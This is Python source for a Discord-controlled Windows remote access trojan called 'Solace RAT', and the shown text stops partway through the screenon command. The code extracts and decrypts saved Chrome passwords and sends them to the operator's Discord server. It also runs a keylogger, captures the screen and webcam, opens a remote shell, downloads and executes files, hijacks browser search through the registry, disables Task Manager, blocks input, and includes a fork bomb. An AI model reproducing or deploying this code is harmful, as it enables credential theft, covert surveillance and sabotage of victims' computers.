import os
import sys
import threading
import asyncio
import ctypes
import json
import socket
import subprocess
import webbrowser
import logging
import pyautogui
import pyperclip
import pygame
import winreg
import shutil
import wave
import pyaudio
import psutil
import win32crypt
import base64
import requests
import datetime
import platform
import numpy as np
from PIL import ImageGrab
from io import BytesIO
from discord.ext import commands
from discord import File, Embed, Intents, Game
from mss import mss
from pynput.keyboard import Key, Listener
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.backends import default_backend
import sqlite3
import argparse

# Configure logging
logging.basicConfig(level=logging.INFO, format='%(asctime)s: %(message)s')

# Ensure running on Windows
if platform.system() != "Windows":
    logging.error("This script is designed to run on Windows only.")
    sys.exit(1)

# Discord Bot Configuration
intents = Intents.all()
bot = commands.Bot(command_prefix='.', intents=intents, help_command=None)
config = {
    'token': 'not_Stealing_my_token',  # Replace with your bot token
    'server_id': '1350570142681141381'  # Replace with your server ID
}
sessions = {}
keylogger_channels = {}
mic_recording_channels = {}
keylogger_threads = {}

# Function to display fake malware signature
def display_fake_signature():
    logging.info("=============================================================")
    logging.info("ALERT: Signature detected: TROJAN.Generic")
    logging.info("Description: Suspicious activity detected. No actual scan performed.")
    logging.info(f"Timestamp: {datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
    logging.info("=============================================================")

# Parse command-line arguments
def parse_arguments():
    parser = argparse.ArgumentParser(description="Solace RAT with bypass option")
    parser.add_argument('--bypass', action='store_true', help='Display fake malware signature')
    return parser.parse_args()

def setup_browser_hijack():
    logging.info("Setting up browser hijack")
    try:
        troll_website = "https://www.example.com/"  # Sanitized URL
        key_path = r"Software\Microsoft\Internet Explorer\SearchScopes"
        with winreg.CreateKey(winreg.HKEY_CURRENT_USER, key_path) as key:
            winreg.SetValueEx(key, "DefaultScope", 0, winreg.REG_SZ, troll_website)
        search_terms = ["how to clear my pc", "how to de-malware my pc"]
        for term in search_terms:
            with winreg.CreateKey(winreg.HKEY_CURRENT_USER, rf"Software\Classes\{term}") as key:
                winreg.SetValueEx(key, "URL Protocol", 0, winreg.REG_SZ, "")
                with winreg.CreateKey(key, "shell\open\command") as command_key:
                    winreg.SetValueEx(command_key, None, 0, winreg.REG_SZ, f'"{sys.executable}" -c "import webbrowser; webbrowser.open(\'{troll_website}\')"')
        logging.info("Browser hijack setup complete.")
    except Exception as e:
        logging.error(f"Failed to set up browser hijack: {e}")

@bot.event
async def on_command_error(ctx, error):
    if isinstance(error, commands.CommandNotFound):
        await ctx.send("Command doesn't exist :skull:")
    else:
        await ctx.send(f"Error: {str(error)}")
        logging.error(f"Command error: {str(error)}")

@bot.event
async def on_ready():
    logging.info(f"Logged in as {bot.user.name}")
    await bot.change_presence(activity=Game(name="Solace RAT Version 1 | made by solace"))
    server = bot.get_guild(int(config['server_id']))
    if not server:
        logging.error("Server not found.")
        return
    category = discord.utils.get(server.categories, name='Sessions')
    if not category:
        category = await server.create_category_channel('Sessions')
        logging.info("Created Sessions category.")
    pcn = socket.gethostname().lower()
    session = discord.utils.get(category.channels, name=pcn)
    if not session:
        session = await category.create_text_channel(pcn)
        sessions[pcn] = session
        logging.info(f"Created session channel '{pcn}'.")
    else:
        sessions[pcn] = session
        logging.info(f"Reconnected to session channel '{pcn}'.")
    keylogger_channel = discord.utils.get(category.channels, name=f'{pcn}_keylogger')
    if not keylogger_channel:
        keylogger_channel = await category.create_text_channel(f'{pcn}_keylogger')
        keylogger_channels[pcn] = keylogger_channel
        logging.info(f"Created keylogger channel '{pcn}_keylogger'.")
    mic_recording_channel = discord.utils.get(category.channels, name=f'{pcn}_mic_recording')
    if not mic_recording_channel:
        mic_recording_channel = await category.create_text_channel(f'{pcn}_mic_recording')
        mic_recording_channels[pcn] = mic_recording_channel
        logging.info(f"Created microphone recording channel '{pcn}_mic_recording'.")
    embed = Embed(
        title="Solace Rat Connected" if not session else "Solace Rat Reconnected",
        description=f"Your Session Key is {pcn} :white_check_mark:\n**Use .help for Commands**",
        color=0x00ff00
    )
    await session.send(embed=embed)
    setup_browser_hijack()

@bot.command()
async def help(ctx):
    logging.info("Help command executed")
    message = """```
Remote Desktop:
  .screenshot <sessionkey>: Takes a screenshot of the user's PC
  .record <sessionkey>: Records the user's screen for 30 seconds
  .webcam <sessionkey>: Captures a picture from the user's webcam
Information Gathering:
  .time <sessionkey>: Retrieves the user's date and time
  .ipinfo <sessionkey>: Retrieves the user's IP information
  .sysinfo <sessionkey>: Retrieves the user's system information
  .cpass <sessionkey>: Obtains target's Chrome passwords
  .usage <sessionkey>: Tells you the user's disk and CPU usage
  .startkeylogger <sessionkey>: Logs key strokes
  .stopkeylogger <sessionkey>: Stops keylogging
  .dumpkeylogger <sessionkey>: Dumps key log file from target machine
  .clipboard <sessionkey>: Sends last few copied items using winreg
File Management:
  .website <sessionkey> <https://example.com>: Opens a website on the user's PC
  .getdownloads <sessionkey>: Lists files in the user's Downloads folder
  .download <sessionkey> <filename>: Downloads a file from the user's Downloads folder
System Control:
  .restart <sessionkey>: Restarts the user's computer
  .shutdown <sessionkey>: Shuts down the user's computer
  .screenoff <sessionkey>: Turns off the user's monitor
  .screenon <sessionkey>: Turns the user's monitor back on
  .dismgr <sessionkey>: Disables Task Manager
  .enablemgr <sessionkey>: Enables Task Manager
  .blockin <sessionkey>: Blocks keyboard and mouse input
  .unblockin <sessionkey>: Unblocks keyboard and mouse input
```
"""
    message2 = """```
Malware Commands:
  .upload <sessionkey> <filelink>: Downloads and runs a file from a Discord link
  .startup <sessionkey>: Adds the bot to startup
  .startmicrecording <sessionkey>: Starts recording microphone every 2 minutes
  .ddos <sessionkey>: COMING SOON
  .spread <sessionkey>: COMING SOON
  .roblox <sessionkey>: COMING SOON
  .exodus <sessionkey>: COMING SOON
Troll Commands:
  .fp <sessionkey>: Opens multiple browser tabs to a specific website
  .fork <sessionkey>: Executes a fork bomb (WARNING: Dangerous)
  .rickroll <sessionkey>: Plays a Rickroll video for 30 seconds
  .music <sessionkey> <file_attachment>: Plays an MP3 file
  .bluescreen <sessionkey>: Simulates a blue screen (requires specific files)
  .winspam <sessionkey>: Opens multiple browser windows (WARNING: Resource-intensive)
```
"""
    message3 = """```
Remote Shell Commands:
  .shell <sessionkey> <command>: Executes a shell command on the user's PC
    └ getmac: Obtains machine's MAC addresses
    └ ipconfig: Obtains machine's IP configuration
    └ tracert: Tracks the pathway a packet takes to the destination
    └ netstat: Lists current open ports
```"""
    await ctx.send(message)
    await ctx.send(message2)
    await ctx.send(message3)
    logging.info("Help command completed")

@bot.command()
async def bluescreen(ctx, seshn: str):
    logging.info(f"Bluescreen command on {seshn.lower()}")
    session = sessions.get(seshn.lower())
    if session:
        nt_os_path = r"C:\Windows\System32\ntoskrnl.exe"
        ke_bugcheck_path = r"C:\Windows\System32\keBugCheck.exe"
        if not os.path.exists(nt_os_path) or not os.path.exists(ke_bugcheck_path):
            logging.warning("Failed to trigger blue screen: Missing required files.")
            await ctx.send("Failed to trigger blue screen :sadge:")
            return
        try:
            subprocess.run([ke_bugcheck_path, nt_os_path], check=True)
            await ctx.send(f"Blue screen triggered on session :rofl:")
            logging.info("Bluescreen triggered successfully")
        except Exception as e:
            logging.error(f"Failed to trigger blue screen: {e}")
            await ctx.send(f"Failed to trigger blue screen: {e}")
    else:
        await ctx.send("Invalid session key")
        logging.error("Bluescreen - Invalid session key")

@bot.command()
async def clipboard(ctx, seshn: str, limit: int = 10):
    logging.info(f"Clipboard command on {seshn.lower()}")
    session = sessions.get(seshn.lower())
    if session:
        try:
            key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU", 0, winreg.KEY_READ)
            clipboard_contents = []
            i = 0
            while i < limit:
                try:
                    name, value, _ = winreg.EnumValue(key, i)
                    clipboard_contents.append(value)
                    i += 1
                except WindowsError:
                    break
            winreg.CloseKey(key)
            if clipboard_contents:
                await ctx.send("\n".join(clipboard_contents[-limit:]))
                logging.info("Clipboard contents retrieved")
            else:
                await ctx.send("No clipboard history found.")
                logging.info("No clipboard history found")
        except Exception as e:
            await ctx.send(f"Failed to retrieve clipboard contents: {e}")
            logging.error(f"Clipboard error: {e}")
    else:
        await ctx.send("Invalid session key")
        logging.error("Clipboard - Invalid session key")

@bot.command()
async def screenshot(ctx, seshn: str):
    logging.info(f"Screenshot command on {seshn.lower()}")
    session = sessions.get(seshn.lower())
    if session:
        try:
            with mss() as sct:
                temp = os.getenv('TEMP')
                output_path = os.path.join(temp, "monitor.png")
                sct.shot(output=output_path)
                file = File(output_path, filename="monitor.png")
                await ctx.send("[*] Screenshot captured", file=file)
                os.remove(output_path)
                logging.info("Screenshot captured")
        except Exception as e:
            await ctx.send(f"Failed to capture screenshot: {e}")
            logging.error(f"Screenshot error: {e}")
    else:
        await ctx.send("Invalid session key")
        logging.error("Screenshot - Invalid session key")

@bot.command()
async def dismgr(ctx, seshn: str):
    logging.info(f"Disable Task Manager command on {seshn.lower()}")
    session = sessions.get(seshn.lower())
    if session:
        try:
            subprocess.run("REG add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v DisableTaskMgr /t REG_DWORD /d 1 /f", shell=True, check=True)
            await ctx.send(f"[*] Task Manager disabled for {seshn}")
            logging.info("Task Manager disabled")
        except Exception as e:
            await ctx.send(f"[ERROR] Failed to disable Task Manager: {e}")
            logging.error(f"Disable Task Manager error: {e}")
    else:
        await ctx.send("Invalid session key")
        logging.error("Disable Task Manager - Invalid session key")

@bot.command()
async def enablemgr(ctx, seshn: str):
    logging.info(f"Enable Task Manager command on {seshn.lower()}")
    session = sessions.get(seshn.lower())
    if session:
        try:
            subprocess.run("REG add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v DisableTaskMgr /t REG_DWORD /d 0 /f", shell=True, check=True)
            await ctx.send(f"[*] Task Manager enabled for {seshn}")
            logging.info("Task Manager enabled")
        except Exception as e:
            await ctx.send(f"[ERROR] Failed to enable Task Manager: {e}")
            logging.error(f"Enable Task Manager error: {e}")
    else:
        await ctx.send("Invalid session key")
        logging.error("Enable Task Manager - Invalid session key")

@bot.command()
async def blockin(ctx, seshn: str):
    logging.info(f"Block Input command on {seshn.lower()}")
    session = sessions.get(seshn.lower())
    if session:
        is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
        if is_admin:
            ctypes.windll.user32.BlockInput(True)
            await ctx.send(f"[*] Keyboard and mouse input blocked for {seshn}")
            logging.info("Input blocked")
        else:
            await ctx.send(f"[ERROR] Admin privileges required to block input for {seshn}")
            logging.error("Block Input - Admin privileges required")
    else:
        await ctx.send("Invalid session key")
        logging.error("Block Input - Invalid session key")

@bot.command()
async def unblockin(ctx, seshn: str):
    logging.info(f"Unblock Input command on {seshn.lower()}")
    session = sessions.get(seshn.lower())
    if session:
        is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
        if is_admin:
            ctypes.windll.user32.BlockInput(False)
            await ctx.send(f"[*] Keyboard and mouse input unblocked for {seshn}")
            logging.info("Input unblocked")
        else:
            await ctx.send(f"[ERROR] Admin privileges required to unblock input for {seshn}")
            logging.error("Unblock Input - Admin privileges required")
    else:
        await ctx.send("Invalid session key")
        logging.error("Unblock Input - Invalid session key")

@bot.command()
async def cpass(ctx, seshn: str):
    logging.info(f"Chrome Passwords command on {seshn.lower()}")
    session = sessions.get(seshn.lower())
    if session:
        def chrometime(ch) -> str:
            return str(datetime.datetime(1601, 1, 1) + datetime.timedelta(microseconds=ch))

        def encryption_key():
            localsp = os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Google", "Chrome", "User Data", "Local State")
            try:
                with open(localsp, "r", encoding="utf-8") as f:
                    ls = json.loads(f.read())
                key = base64.b64decode(ls["os_crypt"]["encrypted_key"])
                key = key[5:]
                return win32crypt.CryptUnprotectData(key, None, None, None, 0)[1]
            except Exception as e:
                logging.error(f"Chrome Passwords - Key error: {e}")
                return None

        def decrypt_password(pw, key) -> str:
            try:
                iv = pw[3:15]
                password = pw[15:]
                cipher = Cipher(algorithms.AES(key), modes.GCM(iv), backend=default_backend())
                decryptor = cipher.decryptor()
                return decryptor.update(password)[:-16].decode()
            except:
                try:
                    return str(win32crypt.CryptUnprotectData(pw, None, None, None, 0)[1])
                except:
                    return ""

        try:
            temp = os.getenv("TEMP")
            pwpath = os.path.join(temp, f"{os.getlogin()}-GooglePasswords.txt")
            if os.path.exists(pwpath):
                os.remove(pwpath)
            key = encryption_key()
            if not key:
                await ctx.send("Failed to retrieve Chrome encryption key")
                logging.error("Chrome Passwords - No encryption key")
                return
            db_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Google", "Chrome", "User Data", "default", "Login Data")
            if not os.path.exists(db_path):
                await ctx.send("Chrome login data not found")
                logging.error("Chrome Passwords - Login data not found")
                return
            filename = os.path.join(temp, "ChromeData.db")
            shutil.copyfile(db_path, filename)
            db = sqlite3.connect(filename)
            cursor = db.cursor()
            cursor.execute("SELECT origin_url, action_url, username_value, password_value, date_created, date_last_used FROM logins ORDER BY date_created")
            with open(pwpath, "a", encoding="utf-8") as ddd:
                for row in cursor.fetchall():
                    origin_url, action_url, username, password, date_created, date_last_used = row
                    password = decrypt_password(password, key)
                    if username or password:
                        ddd.write(f"Origin URL: {origin_url}\nAction URL: {action_url}\nUsername: {username}\nPassword: {password}\nDate Last Used: {chrometime(date_last_used)}\nDate Created: {chrometime(date_created)}\n\n")
            cursor.close()
            db.close()
            os.remove(filename)
            file = File(pwpath, filename=f"{os.getlogin()}-GooglePass.txt")
            await ctx.send(f"{os.getlogin()}'s Google Passwords:", file=file)
            os.remove(pwpath)
            logging.info("Chrome Passwords retrieved")
        except Exception as e:
            await ctx.send(f"Failed to retrieve passwords: {e}")
            logging.error(f"Chrome Passwords error: {e}")
    else:
        await ctx.send("Invalid session key")
        logging.error("Chrome Passwords - Invalid session key")

@bot.command()
async def winspam(ctx, seshn: str):
    logging.info(f"Window Spam command on {seshn.lower()}")
    session = sessions.get(seshn.lower())
    if session:
        embed = Embed(
            title=f"winspam executed on {seshn}",
            description="WARNING: This cannot be stopped until PC crashes or shuts down",
            color=0x00ff00
        )
        await ctx.send(embed=embed)
        threading.Thread(target=lambda: [os.startfile("chrome.exe") for _ in range(100)], daemon=True).start()
        logging.info("Window Spam executed")
    else:
        await ctx.send("Invalid session key")
        logging.error("Window Spam - Invalid session key")

@bot.command()
async def startkeylogger(ctx, seshn: str):
    logging.info(f"Start Keylogger command on {seshn.lower()}")
    session = sessions.get(seshn.lower())
    if session:
        keylogger_channel = keylogger_channels.get(seshn.lower())
        if not keylogger_channel:
            await ctx.send("Keylogger channel not found")
            logging.error("Start Keylogger - No channel")
            return
        if seshn.lower() in keylogger_threads and keylogger_threads[seshn.lower()].is_alive():
            await ctx.send("[*] Keylogger is already running")
            logging.info("Start Keylogger - Already running")
            return
        temp = os.getenv("TEMP")
        log_file_path = os.path.join(temp, "key_log.txt")
        logging.basicConfig(filename=log_file_path, level=logging.DEBUG, format='%(asctime)s: %(message)s')
        sentence = []
        def keylog():
            def on_press(key):
                if not hasattr(keylogger_threads[seshn.lower()], '_running') or not keylogger_threads[seshn.lower()]._running:
                    return False
                if key == Key.enter:
                    with open(log_file_path, "a", encoding="utf-8") as f:
                        f.write(f"{datetime.datetime.now()}: {' '.join(sentence)}\n")
                    sentence.clear()
                else:
                    sentence.append(str(key))
                return True
            with Listener(on_press=on_press) as listener:
                listener.join()
        thread = threading.Thread(target=keylog, daemon=True)
        thread._running = True
        keylogger_threads[seshn.lower()] = thread
        thread.start()
        await ctx.send("[*] Keylogger started")
        await keylogger_channel.send("[*] Keylogger started logging")
        logging.info("Keylogger started")
    else:
        await ctx.send("Invalid session key")
        logging.error("Start Keylogger - Invalid session key")

@bot.command()
async def stopkeylogger(ctx, seshn: str):
    logging.info(f"Stop Keylogger command on {seshn.lower()}")
    session = sessions.get(seshn.lower())
    if session:
        keylogger_channel = keylogger_channels.get(seshn.lower())
        if not keylogger_channel:
            await ctx.send("Keylogger channel not found")
            logging.error("Stop Keylogger - No channel")
            return
        if seshn.lower() in keylogger_threads and keylogger_threads[seshn.lower()].is_alive():
            keylogger_threads[seshn.lower()]._running = False
            await ctx.send("[*] Keylogger stopped")
            await keylogger_channel.send("[*] Keylogger stopped logging")
            del keylogger_threads[seshn.lower()]
            logging.info("Keylogger stopped")
        else:
            await ctx.send("[*] Keylogger is not running")
            logging.info("Keylogger not running")
    else:
        await ctx.send("Invalid session key")
        logging.error("Stop Keylogger - Invalid session key")

@bot.command()
async def dumpkeylogger(ctx, seshn: str):
    logging.info(f"Dump Keylogger command on {seshn.lower()}")
    session = sessions.get(seshn.lower())
    if session:
        temp = os.getenv("TEMP")
        file_keys = os.path.join(temp, "key_log.txt")
        if os.path.exists(file_keys):
            file = File(file_keys, filename="key_log.txt")
            await ctx.send("[*] Key log file", file=file)
            logging.info("Key log file sent")
        else:
            await ctx.send("Key log file not found")
            logging.error("Key log file not found")
    else:
        await ctx.send("Invalid session key")
        logging.error("Dump Keylogger - Invalid session key")

@bot.command()
async def time(ctx, seshn: str):
    logging.info(f"Time command on {seshn.lower()}")
    session = sessions.get(seshn.lower())
    if session:
        ctime = datetime.datetime.now().strftime("%H:%M:%S")
        cdate = datetime.date.today().strftime("%Y-%m-%d")
        await ctx.send(f"Current time: {ctime}\nCurrent date: {cdate}")
        logging.info("Time retrieved")
    else:
        await ctx.send("Invalid session key")
        logging.error("Time - Invalid session key")

@bot.command()
async def ipinfo(ctx, seshn: str):
    logging.info(f"IP Info command on {seshn.lower()}")
    session = sessions.get(seshn.lower())
    if session:
        try:
            response = requests.get("http://ipinfo.io/json")
            data = response.json()
            embed = Embed(title="IP Information", description="IP Details", color=0x800080)
            embed.add_field(name="IP", value=f"```{data.get('ip', 'N/A')}```", inline=False)
            embed.add_field(name="City", value=f"```{data.get('city', 'N/A')}```", inline=True)
            embed.add_field(name="Region", value=f"```{data.get('region', 'N/A')}```", inline=True)
            embed.add_field(name="Country", value=f"```{data.get('country', 'N/A')}```", inline=True)
            embed.add_field(name="Organization", value=f"```{data.get('org', 'N/A')}```", inline=False)
            await ctx.send(embed=embed)
            logging.info("IP Info retrieved")
        except Exception as e:
            await ctx.send(f"Failed to retrieve IP info: {e}")
            logging.error(f"IP Info error: {e}")
    else:
        await ctx.send("Invalid session key")
        logging.error("IP Info - Invalid session key")

@bot.command()
async def sysinfo(ctx, seshn: str):
    logging.info(f"System Info command on {seshn.lower()}")
    session = sessions.get(seshn.lower())
    if session:
        si = platform.uname()
        embed = Embed(title="System Information", color=0x800080)
        embed.add_field(name="System", value=f"```{si.system}```", inline=False)
        embed.add_field(name="Node Name", value=f"```{si.node}```", inline=True)
        embed.add_field(name="Release", value=f"```{si.release}```", inline=True)
        embed.add_field(name="Version", value=f"```{si.version}```", inline=True)
        embed.add_field(name="Machine", value=f"```{si.machine}```", inline=True)
        embed.add_field(name="Processor", value=f"```{si.processor}```", inline=True)
        await session.send(embed=embed)
        logging.info("System Info retrieved")
    else:
        await ctx.send("Invalid session key")
        logging.error("System Info - Invalid session key")

@bot.command()
async def record(ctx, seshn: str):
    logging.info(f"Screen Record command on {seshn.lower()}")
    session = sessions.get(seshn.lower())
    if session:
        await ctx.send("Recording started")
        try:
            start = datetime.datetime.now()
            duration = datetime.timedelta(seconds=30)
            frames = []
            with mss() as sct:
                while datetime.datetime.now() - start < duration:
                    img = ImageGrab.grab()
                    frames.append(cv2.cvtColor(np.array(img), cv2.COLOR_RGB2BGR))
                    await asyncio.sleep(0.1)
            if not frames:
                await ctx.send("No frames captured")
                logging.error("Screen Record - No frames")
                return
            height, width, _ = frames[0].shape
            outputf = os.path.join(os.getenv("TEMP"), "screen.mp4")
            fourcc = cv2.VideoWriter_fourcc(*'mp4v')
            videow = cv2.VideoWriter(outputf, fourcc, 10, (width, height))
            for frame in frames:
                videow.write(frame)
            videow.release()
            await ctx.send("Recording completed", file=File(outputf))
            os.remove(outputf)
            logging.info("Screen Record completed")
        except Exception as e:
            await ctx.send(f"Failed to record screen: {e}")
            logging.error(f"Screen Record error: {e}")
    else:
        await ctx.send("Invalid session key")
        logging.error("Screen Record - Invalid session key")

@bot.command()
async def errorbox(ctx, seshn: str, *, message: str):
    logging.info(f"Error Box command on {seshn.lower()}")
    session = sessions.get(seshn.lower())
    if session:
        try:
            ctypes.windll.user32.MessageBoxW(None, message, "Error", 0)
            await ctx.send("Error message displayed")
            logging.info("Error Box displayed")
        except Exception as e:
            await ctx.send(f"Failed to display error message: {e}")
            logging.error(f"Error Box error: {e}")
    else:
        await ctx.send("Invalid session key")
        logging.error("Error Box - Invalid session key")

@bot.command()
async def website(ctx, seshn: str, websiteu: str):
    logging.info(f"Website command on {seshn.lower()}")
    session = sessions.get(seshn.lower())
    if session:
        try:
            webbrowser.open(websiteu)
            await ctx.send(f"Opened website: {websiteu}")
            logging.info("Website opened")
        except Exception as e:
            await ctx.send(f"Failed to open website: {e}")
            logging.error(f"Website error: {e}")
    else:
        await ctx.send("Invalid session key")
        logging.error("Website - Invalid session key")

@bot.command()
async def shutdown(ctx, seshn: str):
    logging.info(f"Shutdown command on {seshn.lower()}")
    session = sessions.get(seshn.lower())
    if session:
        try:
            subprocess.run(["shutdown", "/s", "/t", "0"], check=True)
            await ctx.send("Computer shutting down")
            logging.info("Shutdown executed")
        except Exception as e:
            await ctx.send(f"Failed to shutdown: {e}")
            logging.error(f"Shutdown error: {e}")
    else:
        await ctx.send("Invalid session key")
        logging.error("Shutdown - Invalid session key")

@bot.command()
async def restart(ctx, seshn: str):
    logging.info(f"Restart command on {seshn.lower()}")
    session = sessions.get(seshn.lower())
    if session:
        try:
            subprocess.run(["shutdown", "/r", "/t", "0"], check=True)
            await ctx.send("Computer restarting")
            logging.info("Restart executed")
        except Exception as e:
            await ctx.send(f"Failed to restart: {e}")
            logging.error(f"Restart error: {e}")
    else:
        await ctx.send("Invalid session key")
        logging.error("Restart - Invalid session key")

@bot.command()
async def webcam(ctx, seshn: str):
    logging.info(f"Webcam command on {seshn.lower()}")
    session = sessions.get(seshn.lower())
    if session:
        try:
            cap = cv2.VideoCapture(0)
            if not cap.isOpened():
                await ctx.send("Failed to access webcam")
                logging.error("Webcam - No access")
                return
            ret, frame = cap.read()
            if not ret:
                await ctx.send("Failed to capture webcam image")
                cap.release()
                logging.error("Webcam - Capture failed")
                return
            output = os.path.join(os.getenv("TEMP"), "webcam.jpg")
            cv2.imwrite(output, frame)
            await ctx.send(file=File(output))
            os.remove(output)
            cap.release()
            logging.info("Webcam image captured")
        except Exception as e:
            await ctx.send(f"Failed to capture webcam: {e}")
            logging.error(f"Webcam error: {e}")
    else:
        await ctx.send("Invalid session key")
        logging.error("Webcam - Invalid session key")

@bot.command()
async def shell(ctx, seshn: str, *, command: str):
    logging.info(f"Shell command on {seshn.lower()}")
    session = sessions.get(seshn.lower())
    if session:
        try:
            output = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT, universal_newlines=True)
            output_path = os.path.join(os.getenv("TEMP"), "output.txt")
            with open(output_path, "w", encoding="utf-8") as file:
                file.write(output)
            await ctx.send(file=File(output_path))
            os.remove(output_path)
            logging.info("Shell command executed")
        except subprocess.CalledProcessError as e:
            await ctx.send(f"Command failed: {e.output}")
            logging.error(f"Shell command failed: {e.output}")
        except Exception as e:
            await ctx.send(f"Failed to execute command: {e}")
            logging.error(f"Shell command error: {e}")
    else:
        await ctx.send("Invalid session key")
        logging.error("Shell - Invalid session key")

@bot.command()
async def usage(ctx, seshn: str):
    logging.info(f"System Usage command on {seshn.lower()}")
    session = sessions.get(seshn.lower())
    if session:
        try:
            disku = psutil.disk_usage("/")
            totaldick = round(disku.total / (1024 ** 3), 2)
            useddick = round(disku.used / (1024 ** 3), 2)
            dickperc = disku.percent
            cpuperc = psutil.cpu_percent(interval=1)
            embed = Embed(title="System Usage", color=0x800080)
            embed.add_field(name="Session", value=seshn, inline=False)
            embed.add_field(name="Disk", value=f"{useddick} GB / {totaldick} GB ({dickperc}%)", inline=False)
            embed.add_field(name="CPU", value=f"{cpuperc}%", inline=False)
            await ctx.send(embed=embed)
            logging.info("System Usage retrieved")
        except Exception as e:
            await ctx.send(f"Failed to retrieve system usage: {e}")
            logging.error(f"System Usage error: {e}")
    else:
        await ctx.send("Invalid session key")
        logging.error("System Usage - Invalid session key")

@bot.command()
async def upload(ctx, seshn: str, filel: str):
    logging.info(f"Upload File command on {seshn.lower()}")
    session = sessions.get(seshn.lower())
    if session:
        if not filel.startswith("https://cdn.discordapp.com"):
            await ctx.send("Invalid link. Must be a Discord attachment link.")
            logging.error("Upload File - Invalid link")
            return
        try:
            response = requests.get(filel)
            if response.status_code == 200:
                filen = filel.split("/")[-1]
                filep = os.path.join(os.getcwd(), filen)
                with open(filep, "wb") as file:
                    file.write(response.content)
                subprocess.Popen(["start", filep], shell=True)
                await ctx.send("File downloaded and executed")
                logging.info("Upload File executed")
            else:
                await ctx.send("Failed to download file")
                logging.error("Upload File - Download failed")
        except Exception as e:
            await ctx.send(f"Error during file upload/execution: {e}")
            logging.error(f"Upload File error: {e}")
    else:
        await ctx.send("Invalid session key")
        logging.error("Upload File - Invalid session key")

@bot.command()
async def getdownloads(ctx, seshn: str):
    logging.info(f"Get Downloads command on {seshn.lower()}")
    session = sessions.get(seshn.lower())
    if session:
        try:
            downloadf = os.path.expanduser("~\\Downloads")
            files = os.listdir(downloadf)
            if not files:
                await ctx.send("No files found in Downloads")
                logging.info("Get Downloads - No files")
                return
            filel = "\n".join(files)
            output_path = os.path.join(os.getenv("TEMP"), "CdriveDownload.txt")
            with open(output_path, "w", encoding="utf-8") as file:
                file.write(filel)
            await ctx.send(file=File(output_path))
            os.remove(output_path)
            logging.info("Get Downloads retrieved")
        except Exception as e:
            await ctx.send(f"Failed to list downloads: {e}")
            logging.error(f"Get Downloads error: {e}")
    else:
        await ctx.send("Invalid session key")
        logging.error("Get Downloads - Invalid session key")

@bot.command()
async def download(ctx, seshn: str, filename: str):
    logging.info(f"Download File command on {seshn.lower()}")
    session = sessions.get(seshn.lower())
    if session:
        try:
            download = os.path.expanduser("~\\Downloads")
            file = os.path.join(download, filename)
            if os.path.isfile(file):
                await ctx.send(f"Downloading {filename}", file=File(file))
                logging.info("Download File sent")
            else:
                await ctx.send("File not found")
                logging.error("Download File - Not found")
        except Exception as e:
            await ctx.send(f"Failed to download file: {e}")
            logging.error(f"Download File error: {e}")
    else:
        await ctx.send("Invalid session key")
        logging.error("Download File - Invalid session key")

@bot.command()
async def music(ctx, seshn: str):
    logging.info(f"Play Music command on {seshn.lower()}")
    session = sessions.get(seshn.lower())
    if session:
        if not ctx.message.attachments:
            await ctx.send("Please attach an MP3 file")
            logging.error("Play Music - No attachment")
            return
        attachment = ctx.message.attachments[0]
        if not attachment.filename.endswith('.mp3'):
            await ctx.send("File must be an MP3")
            logging.error("Play Music - Invalid format")
            return
        download = os.path.join(os.getcwd(), attachment.filename)
        try:
            await attachment.save(download)
            pygame.mixer.init()
            pygame.mixer.music.load(download)
            await ctx.send("Playing music...")
            pygame.mixer.music.play()
            while pygame.mixer.music.get_busy():
                await asyncio.sleep(1)
            await ctx.send("Finished playing music")
            logging.info("Play Music completed")
        except Exception as e:
            await ctx.send(f"Failed to play music: {e}")
            logging.error(f"Play Music error: {e}")
        finally:
            if pygame.mixer.get_init():
                pygame.mixer.quit()
            if os.path.exists(download):
                os.remove(download)
    else:
        await ctx.send("Invalid session key")
        logging.error("Play Music - Invalid session key")

@bot.command()
async def fp(ctx, seshn: str):
    logging.info(f"Flood Pages command on {seshn.lower()}")
    session = sessions.get(seshn.lower())
    if session:
        website = "https://www.example.com"  # Sanitized URL
        try:
            for _ in range(100):
                webbrowser.open(website)
            await ctx.send("Opened multiple browser tabs")
            logging.info("Flood Pages completed")
        except Exception as e:
            await ctx.send(f"Failed to open tabs: {e}")
            logging.error(f"Flood Pages error: {e}")
    else:
        await ctx.send("Invalid session key")
        logging.error("Flood Pages - Invalid session key")

@bot.command()
async def rickroll(ctx, seshn: str):
    logging.info(f"Rickroll command on {seshn.lower()}")
    session = sessions.get(seshn.lower())
    if session:
        videou = "https://cdn.discordapp.com/attachments/1350570142681141381/1098381234567890123/rickroll.mp4"
        try:
            response = requests.get(videou)
            output = os.path.join(os.getenv("TEMP"), "video.mp4")
            with open(output, 'wb') as file:
                file.write(response.content)
            videop = subprocess.Popen(['start', output], shell=True)
            await ctx.send("Rickrolling victim")
            await asyncio.sleep(30)
            videop.terminate()
            os.remove(output)
            logging.info("Rickroll completed")
        except Exception as e:
            await ctx.send(f"Failed to rickroll: {e}")
            logging.error(f"Rickroll error: {e}")
    else:
        await ctx.send("Invalid session key")
        logging.error("Rickroll - Invalid session key")

@bot.command()
async def screenoff(ctx, seshn: str):
    logging.info(f"Screen Off command on {seshn.lower()}")
    session = sessions.get(seshn.lower())
    if session:
        try:
            WM_SYSCOMMAND = 0x0112
            SC_MONITORPOWER = 0xF170
            HWND_BROADCAST = 0xFFFF
            ctypes.windll.user32.SendMessageW(HWND_BROADCAST, WM_SYSCOMMAND, SC_MONITORPOWER, 2)
            await ctx.send("Monitor turned off")
            logging.info("Screen Off completed")
        except Exception as e:
            await ctx.send(f"Failed to turn off monitor: {e}")
            logging.error(f"Screen Off error: {e}")
    else:
        await ctx.send("Invalid session key")
        logging.error("Screen Off - Invalid session key")

@bot.command()
async def screenon(ctx, seshn: str):
    logging.info(f"Screen On command on {seshn.lower()}")
    session = sessions.get(seshn.lower())
    if session:
        try:
            WM_SYSCOMMAND = 0x0112
            SC_MONITORPOWER = 0xF170
            HWND_BROADCAST = 0xFFFF
